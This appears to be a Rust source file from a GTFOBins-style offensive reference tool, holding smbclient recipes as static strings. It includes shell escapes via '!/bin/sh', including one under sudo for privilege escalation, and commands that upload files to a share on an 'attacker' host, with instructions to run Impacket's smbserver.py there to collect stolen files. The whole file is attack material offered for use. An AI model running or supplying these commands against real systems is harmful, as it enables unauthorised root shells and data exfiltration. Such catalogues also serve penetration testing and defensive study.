pub static BIN_NAME: &'static str = "smbclient";
pub static BIN_DESC: &'static str = "A valid SMB/CIFS server must be available";
pub static SH_CODE: &'static str = r#"
    
    smbclient '\\attacker\share'
    !/bin/sh
"#;
pub static FU_DESC: &'static str = "Install `Impacket` and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.";
pub static FU_CODE: &'static str = r#"
    
    smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
"#;
pub static FD_DESC: &'static str = "Install `Impacket` and run `sudo smbserver.py share /tmp` on the attacker box to send the file.";
pub static FD_CODE: &'static str = r#"
    
    smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo smbclient '\\attacker\share'
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
